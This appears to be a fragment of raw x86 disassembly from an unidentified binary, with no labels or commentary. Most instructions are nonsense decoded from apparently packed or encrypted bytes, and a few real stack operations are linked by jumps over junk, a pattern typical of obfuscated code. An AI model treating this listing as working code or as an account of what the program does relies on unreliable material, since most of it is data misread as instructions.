  40c832:	call   DWORD PTR [ebx-0x17]
  40c835:	pop    edi
  40c836:	and    eax,0x4c5497
  40c83b:	mov    bh,0x27
  40c83d:	loope  0x40c883
  40c83f:	aas    
  40c840:	outs   dx,BYTE PTR ds:[esi]
  40c841:	mov    edi,0x96049ee1
  40c846:	sahf   
  40c847:	std    
  40c848:	add    eax,0x95344d52
  40c84d:	and    al,BYTE PTR [ecx+0x2ad93c0a]
  40c853:	pop    esi
  40c854:	or     ebp,eax
  40c856:	loopne 0x40c8d2
  40c858:	shl    DWORD PTR [edi],1
  40c85a:	xchg   ecx,eax
  40c85b:	and    eax,0x112fe8e6
  40c860:	xlat   BYTE PTR ds:[ebx]
  40c861:	adc    BYTE PTR [eax],bl
  40c863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c864:	or     BYTE PTR [eax-0x7128d4a3],ch
  40c86a:	imul   eax,DWORD PTR [eax-0x24],0xa9722e58
  40c871:	sub    BYTE PTR [ecx+0x1a],cl
  40c874:	inc    ebx
  40c875:	imul   ebp,edi,0x2b6ef4c2
  40c87b:	int3   
  40c87c:	lods   al,BYTE PTR ds:[esi]
  40c87d:	arpl   WORD PTR [ebx*4-0x2a43b194],dx
  40c884:	mov    edx,0x170b7c9e
  40c889:	dec    BYTE PTR [eax+0x2d]
  40c88c:	repnz mov eax,DWORD PTR [ebp+0xc]
  40c890:	add    eax,DWORD PTR [ebp+0x8]
  40c893:	mov    DWORD PTR [ebp-0x10],eax
  40c896:	mov    eax,DWORD PTR [ebp-0x1c]
  40c899:	test   eax,eax
  40c89b:	je     0x40d717
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0x9ac439ac
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c890
  40c8c7:	retf   
  40c8c8:	aas    
  40c8c9:	mov    esi,0xa4639a55
  40c8ce:	bound  esi,QWORD PTR [ecx]
  40c8d0:	mov    ds,WORD PTR [eax+edx*8-0x7874c794]
  40c8d7:	xchg   ecx,eax
  40c8d8:	fstp   TBYTE PTR [ecx]
  40c8da:	in     eax,0x7c
  40c8dc:	pushf  
  40c8dd:	call   0x8f2706ac
  40c8e2:	jo     0x40c87c
  40c8e4:	dec    ecx
  40c8e5:	cdq    
  40c8e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8e7:	adc    BYTE PTR gs:[edi+0x4f8d9fe3],0xb6
  40c8ef:	mov    edx,gs
  40c8f1:	xor    BYTE PTR [edx-0x50],al
  40c8f4:	inc    edi
  40c8f5:	repz aaa 
  40c8f7:	cs push ecx
  40c8f9:	cmp    edi,DWORD PTR [edi+0x79]
  40c8fc:	in     al,0x92
  40c8fe:	retf   0x856a
  40c901:	adc    ebx,DWORD PTR [ebx-0xbd16dc7]
  40c907:	neg    DWORD PTR [edi]
  40c909:	cmp    al,0x54
  40c90b:	je     0x40c907
  40c90d:	pop    es
  40c90e:	xchg   BYTE PTR [edx],al
  40c910:	sbb    esi,DWORD PTR [edx-0x59]
  40c913:	(bad)  
  40c914:	cmp    bl,bh
  40c916:	js     0x40c995
  40c918:	outs   dx,BYTE PTR ds:[esi]
  40c919:	bound  edx,QWORD PTR [ebp+ebx*2+0x7277f8fa]
  40c920:	ja     0x40c907
  40c922:	jmp    0x40c91d
  40c924:	ficom  DWORD PTR [edx-0x7c67061f]
  40c92a:	shr    DWORD PTR [eax-0x36c6541f],cl
  40c930:	fild   QWORD PTR [edx-0x51d207e8]
  40c936:	cmp    eax,DWORD PTR [ecx+0x6a]
  40c939:	xchg   edi,eax
  40c93a:	sbb    bh,0x7b
  40c93d:	mov    ecx,0x80e8e191
  40c942:	sti    
  40c943:	arpl   bx,cx
  40c945:	inc    ebp
  40c946:	mov    cl,0xbe
  40c948:	fs fs in eax,0x85
  40c94c:	jmp    0x8528:0xc920fb69
  40c953:	sub    DWORD PTR [esi+edi*4+0x46],0xbbc88adf
  40c95b:	mov    edx,ss
  40c95d:	bound  eax,QWORD PTR [ecx+0x1a]
  40c960:	sbb    BYTE PTR [ebx+eiz*2-0x21],ah
  40c964:	sub    BYTE PTR [ecx+0xc],0x85
  40c968:	mov    ah,0x69
  40c96a:	icebp  
  40c96b:	repnz mov ds:0x9a2e78d1,al
  40c971:	pusha  
  40c972:	mov    ds:0x445d2c2a,eax
  40c977:	sahf   
  40c978:	inc    esp
  40c979:	xchg   ecx,eax
  40c97a:	outs   dx,BYTE PTR ds:[esi]
  40c97b:	shr    DWORD PTR [ecx+0x41],cl
  40c97e:	loope  0x40c96f
  40c980:	xchg   ebx,eax
  40c981:	fistp  WORD PTR [eax]
  40c983:	add    ebp,DWORD PTR [esi-0x1f]
  40c986:	repz mov dl,0x64
  40c989:	pop    es
  40c98a:	pusha  
  40c98b:	mov    ds:0x9fb6514f,al
  40c990:	cmp    eax,0x3d10c224
  40c995:	lods   eax,DWORD PTR ds:[esi]
  40c996:	push   edi
  40c997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c998:	les    ecx,FWORD PTR [edi-0x34]
  40c99b:	sar    ebx,1
  40c99d:	stc    
  40c99e:	ss in  eax,0x2e
  40c9a1:	mov    edi,0xe346ddc6
  40c9a6:	in     al,0x12
  40c9a8:	add    DWORD PTR [eax],esp
  40c9aa:	fstp   DWORD PTR [edx-0x43e40947]
  40c9b0:	sub    BYTE PTR [ebx+0x6d88714c],0xad
  40c9b7:	out    0x27,al
  40c9b9:	pop    ss
  40c9ba:	jmp    0x40c996
  40c9bc:	sub    DWORD PTR [esi-0x67],edx
  40c9bf:	call   0xfe0dfffd
  40c9c4:	pop    esp
  40c9c5:	hlt    
  40c9c6:	enter  0x3a17,0x46
  40c9ca:	pop    esi
  40c9cb:	icebp  
  40c9cc:	mov    ds:0x287ebf20,al
  40c9d1:	sub    al,0x71
  40c9d3:	jb     0x40c9ab
  40c9d5:	pandn  mm0,mm2
  40c9d8:	das    
  40c9d9:	test   eax,0xc8793f3e
  40c9de:	mov    ebx,0xaa6e7b7d
  40c9e3:	test   al,0xad
  40c9e5:	mov    DWORD PTR [esp+esi*4-0x2aeed7b0],ebp
  40c9ec:	loopne 0x40c9b4
  40c9ee:	push   ss
  40c9ef:	fcomp  QWORD PTR [ebx-0x531e0e42]
  40c9f5:	pop    esp
  40c9f6:	shl    DWORD PTR [ebp-0x2e],1
  40c9f9:	jl     0x40c9e4
  40c9fb:	nop
  40c9fc:	je     0x40c991
  40c9fe:	pop    ebx
  40c9ff:	cmp    dh,bh
  40ca01:	test   al,0x48
  40ca03:	mov    ch,0xa4
  40ca05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca06:	out    dx,al
  40ca07:	dec    ecx
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x22fdabcf
  40ca1c:	inc    edi
  40ca1d:	dec    eax
  40ca1e:	hlt    
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40ca62
  40ca26:	in     eax,dx
  40ca27:	lock test BYTE PTR [eax+0x1d],ch
  40ca2b:	and    al,0xd
  40ca2d:	mov    ds:0x3cca88b9,al
  40ca32:	sbb    dh,0xf3
  40ca35:	push   ss
  40ca36:	out    0xf,eax
  40ca38:	add    DWORD PTR [esi-0x43],edi
  40ca3b:	scas   al,BYTE PTR es:[edi]
  40ca3c:	jle    0x40c9dc
  40ca3e:	js     0x40ca59
  40ca40:	sar    BYTE PTR [esi],cl
  40ca42:	pop    esp
  40ca43:	scas   al,BYTE PTR es:[edi]
  40ca44:	jge    0x40ca6b
  40ca46:	cmove  esp,DWORD PTR [eax+0x7001be1a]
  40ca4d:	mov    al,0x96
  40ca4f:	scas   al,BYTE PTR es:[edi]
  40ca50:	add    eax,0x472f8489
  40ca55:	add    ch,0x0
  40ca58:	pop    esp
  40ca59:	imul   ecx,DWORD PTR [esi-0x9823cef],0x68
  40ca60:	std    
  40ca61:	add    DWORD PTR [eax],eax
  40ca63:	scas   al,BYTE PTR es:[edi]
  40ca64:	pushf  
  40ca65:	cdq    
  40ca66:	std    
  40ca67:	inc    esi
  40ca68:	inc    ecx
  40ca69:	jne    0x40ca7a
  40ca6b:	mov    edx,0xf7653b6e
  40ca70:	stos   DWORD PTR es:[edi],eax
  40ca71:	mov    WORD PTR [edi],fs
  40ca73:	mov    ecx,0x3a2dbfb8
  40ca78:	in     al,dx
  40ca79:	fcomp  QWORD PTR [edi+ecx*4]
  40ca7c:	pop    eax
  40ca7d:	mov    dh,0x45
  40ca7f:	push   ebp
  40ca80:	aaa    
  40ca81:	or     BYTE PTR [esi],0xe9
  40ca84:	retf   
  40ca85:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40ca87:	dec    ebx
  40ca88:	or     eax,0x562c495
  40ca8d:	maxps  xmm7,xmm0
  40ca90:	mov    edx,0xa6a89d72
  40ca95:	(bad)  
  40ca97:	(bad)  
  40ca99:	bound  eax,QWORD PTR [eax-0x57bac361]
  40ca9f:	cmp    esi,DWORD PTR [eax-0x45760ccd]
  40caa5:	sbb    dl,ch
  40caa7:	jns    0x40ca35
  40caa9:	jge    0x40ca38
  40caab:	and    BYTE PTR [ebx+edx*2],bl
  40caae:	sti    
  40caaf:	es adc cl,al
  40cab2:	int3   
  40cab3:	xchg   esp,eax
  40cab4:	jb     0x40cb32
  40cab6:	(bad)  
  40cab7:	jmp    0x2560:0x95643fb6
  40cabe:	sbb    eax,0x82f7ee39
  40cac3:	arpl   si,dx
  40cac5:	inc    esp
  40cac6:	cmp    al,0xe8
  40cac8:	push   esi
  40cac9:	ds sub eax,0x4fd6513
  40cacf:	xor    ah,BYTE PTR [ecx+ebx*2]
  40cad2:	and    ah,BYTE PTR [eax+0x218216d3]
  40cad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cad9:	sub    ebp,DWORD PTR ss:[ebx]
  40cadc:	imul   edi,DWORD PTR ds:0xe9c76ee4,0xfffffffc
  40cae3:	dec    ecx
  40cae4:	test   DWORD PTR [ecx+esi*2-0x3213868d],0x4f6d44ac
  40caef:	lods   al,BYTE PTR ds:[si]
  40caf1:	dec    ebx
  40caf2:	dec    edi
  40caf3:	mov    eax,0x98bdcc47
  40caf8:	loop   0x40cb1f
  40cafa:	clc    
  40cafb:	pop    edi
  40cafc:	jmp    0x40cac7
  40cafe:	adc    BYTE PTR [edi-0x58bddb87],0xf2
  40cb05:	loop   0x40cb64
  40cb07:	pop    ds
  40cb08:	cld    
  40cb09:	mov    esi,0xc0256e4e
  40cb0e:	and    ebx,DWORD PTR [edx+0xb]
  40cb11:	push   ss
  40cb12:	cmp    al,0x37
  40cb14:	js     0x40cb14
  40cb16:	sbb    BYTE PTR [eax],0x6c
  40cb19:	xlat   BYTE PTR ds:[ebx]
  40cb1a:	daa    
  40cb1b:	stos   DWORD PTR es:[edi],eax
  40cb1c:	push   es
  40cb1d:	jle    0x40cb83
  40cb1f:	call   FWORD PTR [edi-0x74e2e818]
  40cb25:	ror    DWORD PTR [ebx+0x1e],1
  40cb28:	pop    ebp
  40cb29:	adc    al,0xa2
  40cb2b:	out    dx,eax
  40cb2c:	int3   
  40cb2d:	rol    dh,1
  40cb2f:	dec    esp
  40cb30:	adc    DWORD PTR [edx],esp
  40cb32:	dec    esi
  40cb33:	mov    DWORD PTR [ebx+0x2891c63d],edi
  40cb39:	dec    ecx
  40cb3a:	sti    
  40cb3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb3c:	stos   DWORD PTR es:[edi],eax
  40cb3d:	inc    esp
  40cb3e:	jge    0x40cb94
  40cb40:	aaa    
  40cb41:	repnz inc edx
  40cb43:	sti    
  40cb44:	mov    WORD PTR [eax+0x77b73e05],?
  40cb4a:	pop    ebx
  40cb4b:	add    DWORD PTR [ecx-0x4d3d7f0c],esp
  40cb51:	cmp    BYTE PTR [ebx-0x5eaaf156],bl
  40cb57:	cs scas eax,DWORD PTR es:[edi]
  40cb59:	ss adc al,0x96
  40cb5c:	inc    ebp
  40cb5d:	mov    esi,0xf779d654
  40cb62:	cmp    esi,edx
  40cb64:	(bad)  
  40cb65:	cvtdq2ps xmm0,XMMWORD PTR [edi-0x7826d435]
  40cb6c:	retf   
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cbcd
  40cb8b:	xchg   ecx,eax
  40cb8c:	neg    DWORD PTR [edi]
  40cb8e:	or     esi,esi
  40cb90:	jle    0x40cc10
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cb68
  40cb97:	outs   dx,DWORD PTR ds:[esi]
  40cb98:	mov    ds:0xda22850,eax
  40cb9d:	test   eax,0xe6334339
  40cba2:	mov    eax,ds:0x6f1473fd
  40cba7:	xlat   BYTE PTR ds:[ebx]
  40cba8:	aam    0x72
  40cbaa:	xchg   edx,eax
  40cbab:	dec    edx
  40cbac:	push   edx
  40cbad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbae:	dec    edx
  40cbaf:	inc    ecx
  40cbb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbb1:	pop    edx
  40cbb2:	cmc    
  40cbb3:	out    0x8c,al
  40cbb5:	mov    ecx,0xea027b52
  40cbba:	gs dec ebx
  40cbbc:	gs mov ebp,0xa0fe617a
  40cbc2:	fcomp  DWORD PTR [ebx+ebx*4-0x6598a0a7]
  40cbc9:	ja     0x40cc42
  40cbcb:	add    ebp,DWORD PTR [ebx+0x76bb0f7]
  40cbd1:	inc    esi
  40cbd2:	pop    esp
  40cbd3:	out    0x9f,eax
  40cbd5:	xchg   edi,eax
  40cbd6:	pusha  
  40cbd7:	cld    
  40cbd8:	adc    al,dh
  40cbda:	(bad)  
  40cbdc:	je     0x40cbb4
  40cbde:	adc    DWORD PTR [edi],esp
  40cbe0:	add    esp,esi
  40cbe2:	inc    ecx
  40cbe3:	xchg   esp,eax
  40cbe4:	(bad)
  40cbe8:	dec    ebp
  40cbe9:	rcl    BYTE PTR [esi+0x49],cl
  40cbec:	sar    ebx,1
  40cbee:	push   edi
  40cbef:	ficom  DWORD PTR [ebp+0x79b7d06b]
  40cbf5:	xor    al,0xdf
  40cbf7:	jno    0x40cb92
  40cbf9:	inc    edx
  40cbfa:	(bad)  
  40cbfb:	xchg   esi,eax
  40cbfc:	xor    eax,0x1eb835c3
  40cc01:	adc    edx,DWORD PTR [ecx-0x27270df5]
  40cc07:	mov    esi,0xd73b7418
  40cc0c:	inc    ebp
  40cc0d:	rol    BYTE PTR [ebx-0x18],cl
  40cc10:	xor    esi,esi
  40cc12:	aad    0x50
  40cc14:	into   
  40cc15:	push   ebx
  40cc16:	add    ah,BYTE PTR [edi]
  40cc18:	xlat   BYTE PTR ds:[ebx]
  40cc19:	repz xchg bx,ax
  40cc1c:	pop    edx
  40cc1d:	adc    DWORD PTR [ebx-0x79],ebx
  40cc20:	mov    ds:0x7a38dcc8,eax
  40cc25:	xor    al,0x1f
  40cc27:	and    bl,BYTE PTR [ebx+0x4d]
  40cc2a:	mov    ah,0xe
  40cc2c:	bnd ret 0x6bdd
  40cc30:	enter  0xf139,0x7e
  40cc34:	adc    bh,BYTE PTR [ecx-0xd5087a]
  40cc3a:	inc    esp
  40cc3b:	adc    DWORD PTR [ebx+0x7e],ebp
  40cc3e:	xor    eax,0x7a4b6245
  40cc43:	mov    eax,0x979cdfe
  40cc48:	xchg   ebp,eax
  40cc49:	ss dec edx
  40cc4b:	or     esp,DWORD PTR [ebp-0x7db0b519]
  40cc51:	call   0x48d8:0x478a28df
  40cc58:	inc    edi
  40cc59:	mov    eax,0x512f2e80
  40cc5e:	sbb    bh,bh
  40cc60:	test   dh,dh
  40cc62:	(bad)  
  40cc63:	aaa    
  40cc64:	rcr    BYTE PTR [edx],1
  40cc66:	push   esp
  40cc67:	and    eax,0x413ed8f5
  40cc6c:	neg    BYTE PTR [edx+0x1218b616]
  40cc72:	adc    BYTE PTR es:[eax+0x59b0d966],0x2e
  40cc7a:	dec    ebp
  40cc7b:	fadd   st(5),st
  40cc7d:	jns    0x40cce7
  40cc7f:	(bad)  
  40cc80:	cmp    al,0xd3
  40cc82:	xchg   edx,eax
  40cc83:	lods   eax,DWORD PTR ds:[esi]
  40cc84:	sbb    BYTE PTR [ebx-0x55],0xee
  40cc88:	mov    eax,0x4a6a9f24
  40cc8d:	inc    edi
  40cc8e:	(bad)  
  40cc8f:	aas    
  40cc90:	inc    edi
  40cc91:	ss push esi
  40cc93:	and    BYTE PTR [edi+eiz*4],cl
  40cc96:	sbb    ah,ch
  40cc98:	shr    DWORD PTR [edx],1
  40cc9a:	jns    0x40ccbe
  40cc9c:	inc    esi
  40cc9d:	hlt    
  40cc9e:	daa    
  40cc9f:	rol    BYTE PTR [esi*4+0x7083528d],0xd1
  40cca7:	cli    
  40cca8:	shl    esp,1
  40ccaa:	pop    ds
  40ccab:	cmc    
  40ccac:	dec    ecx
  40ccad:	dec    DWORD PTR [ebx+0x823edb]
  40ccb3:	fst    st(3)
  40ccb5:	pusha  
  40ccb6:	push   ds
  40ccb7:	lods   al,BYTE PTR gs:[esi]
  40ccb9:	or     al,cl
  40ccbb:	retf   0x29ee
  40ccbe:	fwait
  40ccbf:	call   0x89882d70
  40ccc4:	sbb    al,0xcd
  40ccc6:	mov    ch,0xb
  40ccc8:	add    DWORD PTR [eax],esi
  40ccca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cccb:	adc    ebx,DWORD PTR [esi]
  40cccd:	mov    al,0x96
  40cccf:	jle    0x40ccd0
  40ccd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccd2:	ss stc 
  40ccd4:	hlt    
  40ccd5:	jg     0x40cd17
  40ccd7:	mov    eax,DWORD PTR [ebp-0x4]
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0xe4ec1d3a
  40ccf1:	cmp    BYTE PTR [ecx+0x3f],ch
  40ccf4:	retf   0x7ef7
  40ccf7:	jle    0x40cd38
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd5e
  40ccfd:	ins    BYTE PTR es:[edi],dx
  40ccfe:	sbb    BYTE PTR [ebx-0x16ad6a58],0xe5
  40cd05:	stc    
  40cd06:	leave  
  40cd07:	nop
  40cd08:	push   0xffffffe3
  40cd0a:	pushf  
  40cd0b:	jp     0x40cca6
  40cd0d:	idiv   BYTE PTR [esi-0x12]
  40cd10:	ror    esp,cl
  40cd12:	int3   
  40cd13:	push   cs
  40cd14:	and    cl,BYTE PTR [esi+0x35b02c95]
  40cd1a:	sub    BYTE PTR [ebx],al
  40cd1c:	jo     0x40cced
  40cd1e:	mov    ebp,0x70ec11cd
  40cd23:	hlt    
  40cd24:	(bad)  
  40cd25:	pop    eax
  40cd26:	iret   
  40cd27:	inc    edi
  40cd28:	popf   
  40cd29:	js     0x40ccbe
  40cd2b:	aas    
  40cd2c:	jno    0xfe9b79a9
  40cd32:	in     eax,0x1b
  40cd34:	inc    ebx
  40cd35:	or     bl,BYTE PTR [esi-0x3]
  40cd38:	push   edx
  40cd39:	adc    ch,dl
  40cd3b:	stos   DWORD PTR es:[edi],eax
  40cd3c:	lods   al,BYTE PTR ds:[esi]
  40cd3d:	or     eax,0xe2fbd555
  40cd42:	mov    DWORD PTR [ecx],esi
  40cd44:	ret    
  40cd45:	sar    BYTE PTR [ecx-0x3e],1
  40cd48:	dec    eax
  40cd49:	fsubp  st(1),st
  40cd4b:	retf   0xaae
  40cd4e:	fdiv   QWORD PTR [eax+0x68]
  40cd51:	inc    ebp
  40cd52:	or     eax,0x9f7713b3
  40cd57:	add    BYTE PTR [eax-0x6c],0x5
  40cd5b:	sbb    BYTE PTR [eax],dl
  40cd5d:	in     al,dx
  40cd5e:	clc    
  40cd5f:	push   cs
  40cd60:	rcr    BYTE PTR [ebp+0x72d03910],cl
  40cd66:	mov    al,0x85
  40cd68:	jmp    0xe32d:0xe826ecfe
  40cd6f:	cmp    DWORD PTR [edi+0x1],0xc3e3356b
  40cd76:	(bad)  
  40cd77:	adc    al,0x66
  40cd79:	sub    ebx,DWORD PTR [ecx]
  40cd7b:	mov    ecx,0x38b45ed0
  40cd80:	xchg   esi,eax
  40cd81:	mov    bl,0xfe
  40cd83:	and    DWORD PTR [esi-0x32443f9],eax
  40cd89:	lock jmp DWORD PTR [esi+0x51c42e64]
  40cd90:	daa    
  40cd91:	stos   DWORD PTR es:[edi],eax
  40cd92:	loope  0x40cd33
  40cd94:	add    esi,ebp
  40cd96:	fcmovbe st,st(5)
  40cd98:	imul   edi,esp,0xffffffa9
  40cd9b:	mov    ebx,0x640f3ec4
  40cda0:	and    DWORD PTR [esi],0x630f98b
  40cda6:	adc    DWORD PTR [eax-0x7db2f62e],ebx
  40cdac:	loope  0x40cdbe
  40cdae:	cwde   
  40cdaf:	gs mov ebx,0xd2370ab0
  40cdb5:	sub    BYTE PTR [ecx],dh
  40cdb7:	push   es
  40cdb8:	mov    DWORD PTR [ecx+0x2b],edx
  40cdbb:	mov    dl,0xc8
  40cdbd:	cmp    ecx,DWORD PTR [edi+0x66]
  40cdc0:	xchg   BYTE PTR [eax-0x1a],bl
  40cdc3:	adc    eax,0xfedde6d8
  40cdc8:	pop    ss
  40cdc9:	xchg   ebx,eax
  40cdca:	sbb    DWORD PTR [ebp-0x484c9c79],eax
  40cdd0:	jnp    0x40cd9c
  40cdd2:	mov    ds:0x5b0f4316,eax
  40cdd7:	jb     0x40ce05
  40cdd9:	xlat   BYTE PTR ds:[ebx]
  40cdda:	or     al,0x5d
  40cddc:	cmp    eax,0xe3cbc34
  40cde1:	mov    ebp,0xc1e31f22
  40cde6:	mov    edx,0x80d84e0
  40cdeb:	adc    eax,0x31faabea
  40cdf0:	xchg   esi,eax
  40cdf1:	jmp    0x40cdd1
  40cdf3:	(bad)  
  40cdf5:	mov    bl,0x4c
  40cdf7:	out    0xfd,al
  40cdf9:	inc    edi
  40cdfa:	fcmovbe st,st(5)
  40cdfc:	jns    0x40ce19
  40cdfe:	sub    eax,0x85578f75
  40ce03:	rol    BYTE PTR [eax-0x35bf8c0c],0x9b
  40ce0a:	add    eax,0x5c0ca684
  40ce0f:	repnz pop eax
  40ce11:	popa   
  40ce12:	mov    ah,0xb2
  40ce14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce15:	es es shr esi,cl
  40ce19:	adc    eax,0x8a6ff6f7
  40ce1e:	push   ebx
  40ce1f:	ins    DWORD PTR es:[edi],dx
  40ce20:	jecxz  0x40ce5e
  40ce22:	sub    ch,al
  40ce24:	dec    esp
  40ce25:	ja     0x40cdfb
  40ce27:	mov    dh,0xf1
  40ce29:	loopne 0x40cea4
  40ce2b:	fst    QWORD PTR [esi+0x4dba178]
  40ce31:	xor    ebp,DWORD PTR [ebp-0x95bae79]
  40ce37:	cli    
  40ce38:	add    bh,0x78
  40ce3b:	or     ch,BYTE PTR [esi]
  40ce3d:	xor    eax,ecx
  40ce3f:	mov    edx,0x32729d
  40ce44:	add    eax,edx
  40ce46:	jmp    0x40cfa4
  40ce4b:	mov    dl,0xd7
  40ce4d:	or     al,0x5b
  40ce4f:	lods   eax,DWORD PTR ds:[esi]
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x3525331,eax
  40ce59:	sbb    al,0xe8
  40ce5b:	mov    ecx,DWORD PTR [eax+0x7f3f7e7e]
  40ce61:	jle    0x40cee1
  40ce63:	xchg   ecx,eax
  40ce64:	mov    ds:0xcd438f75,al
  40ce69:	adc    al,al
  40ce6b:	mov    edi,0xb4be3e7e
  40ce70:	enter  0x7c97,0xc6
  40ce74:	lahf   
  40ce75:	mov    ecx,0xb39cf5ef
  40ce7a:	mov    al,ds:0xa564dfc8
  40ce7f:	pop    ds
  40ce80:	(bad)  
  40ce81:	jns    0x40ce2b
  40ce83:	fbld   TBYTE PTR [esp]
  40ce86:	dec    ebx
  40ce87:	stos   BYTE PTR es:[edi],al
  40ce88:	sbb    al,0xc4
  40ce8a:	out    dx,al
  40ce8b:	or     eax,0x48a2acc8
  40ce90:	add    BYTE PTR [esi+0x214b0f63],dh
  40ce96:	pop    ecx
  40ce97:	jecxz  0x40ced2
  40ce99:	sub    BYTE PTR [esi+0x6],0x3
  40ce9d:	pop    ebx
  40ce9e:	ds in  eax,0x3b
  40cea1:	test   eax,edx
  40cea3:	adc    eax,0x6214ef8e
  40cea8:	fisub  DWORD PTR [esi+0x7f00e97a]
  40ceae:	adc    bh,ch
  40ceb0:	pop    eax
  40ceb1:	mov    ecx,0xbf95e952
  40ceb6:	mov    bl,0x39
  40ceb8:	dec    eax
  40ceb9:	test   al,0x2a
  40cebb:	aas    
  40cebc:	fnstcw WORD PTR [ebp+ebp*8-0x45]
  40cec0:	dec    eax
  40cec1:	inc    esi
  40cec2:	mov    BYTE PTR [ecx],bl
  40cec4:	inc    esi
  40cec5:	xchg   esp,eax
  40cec6:	push   ebx
  40cec7:	adc    al,0xcd
  40cec9:	and    DWORD PTR [edi+eiz*1+0x3f],edi
  40cecd:	nop
  40cece:	cmp    cl,BYTE PTR [ebx]
  40ced0:	pop    ss
  40ced1:	jbe    0x40cf28
  40ced3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ced4:	repz and DWORD PTR [eax-0x69],edi
  40ced8:	js     0x40cea5
  40ceda:	clc    
  40cedb:	sub    bl,ch
  40cedd:	and    ebp,edx
  40cedf:	retf   0x2ddc
  40cee2:	int    0xff
  40cee4:	mul    ch
  40cee6:	add    dl,al
  40cee8:	push   edx
  40cee9:	push   0x3c
  40ceeb:	out    dx,eax
  40ceec:	and    al,ah
  40ceee:	daa    
  40ceef:	es mov dl,0x9a
  40cef2:	push   ebx
  40cef3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cef5:	imul   ecx,DWORD PTR [esi],0xffffffd0
  40cef8:	adc    ecx,eax
  40cefa:	push   cs
  40cefb:	inc    eax
  40cefc:	test   al,0x9c
  40cefe:	adc    al,0xb5
  40cf00:	and    DWORD PTR [ecx+0x44],0xd
  40cf04:	mov    ebp,0xf2adf62a
  40cf09:	jle    0x40cf6f
  40cf0b:	arpl   WORD PTR [edi],si
  40cf0d:	je     0x40cf7f
  40cf0f:	(bad)  
  40cf11:	adc    cl,dl
  40cf13:	std    
  40cf14:	inc    ecx
  40cf15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf16:	ret    0x2a0d
  40cf19:	sbb    dh,BYTE PTR [ebp+0x43608d98]
  40cf1f:	fistp  DWORD PTR [edi+0x5d464fd1]
  40cf25:	sub    DWORD PTR [ecx],ebx
  40cf27:	daa    
  40cf28:	adc    esi,edi
  40cf2a:	into   
  40cf2b:	jecxz  0x40cf0b
  40cf2d:	aas    
  40cf2e:	imul   bp,WORD PTR [edx-0x6f5a618],0xe7f8
  40cf37:	mov    dh,0x8b
  40cf39:	pop    es
  40cf3a:	and    BYTE PTR [esi-0x3a],0x29
  40cf3e:	(bad)  
  40cf3f:	repnz mov ecx,0x129e7e2a
  40cf45:	xchg   esp,eax
  40cf46:	xor    eax,DWORD PTR [edx+0x653188a]
  40cf4c:	(bad)  
  40cf4d:	fcomip st,st(2)
  40cf4f:	ins    DWORD PTR es:[edi],dx
  40cf50:	or     DWORD PTR [esp-0x4c53ba8],eax
  40cf57:	push   edi
  40cf58:	outs   dx,DWORD PTR ds:[esi]
  40cf59:	cmp    al,0xe2
  40cf5b:	xchg   ebp,eax
  40cf5c:	xor    al,0x98
  40cf5e:	add    eax,0x12cd6c22
  40cf63:	lds    eax,FWORD PTR [edi]
  40cf65:	jbe    0x40cfda
  40cf67:	xchg   dh,ch
  40cf69:	test   al,0x11
  40cf6b:	test   BYTE PTR [ebp+0x1d],ch
  40cf6e:	xchg   edi,eax
  40cf6f:	sbb    ah,BYTE PTR [edx]
  40cf71:	mov    esp,0x21daeaaf
  40cf76:	dec    ecx
  40cf77:	repnz or BYTE PTR [edi-0x37],cl
  40cf7b:	(bad)  
  40cf7c:	out    0xb,al
  40cf7e:	cli    
  40cf7f:	retf   0x42f9
  40cf82:	in     eax,dx
  40cf83:	ja     0x40cf14
  40cf85:	xor    DWORD PTR [ebx],0x10409de4
  40cf8b:	xchg   ecx,eax
  40cf8c:	int    0xf9
  40cf8e:	(bad)  
  40cf8f:	jecxz  0x40cf2a
  40cf91:	mov    edi,db0
  40cf94:	add    al,0xb5
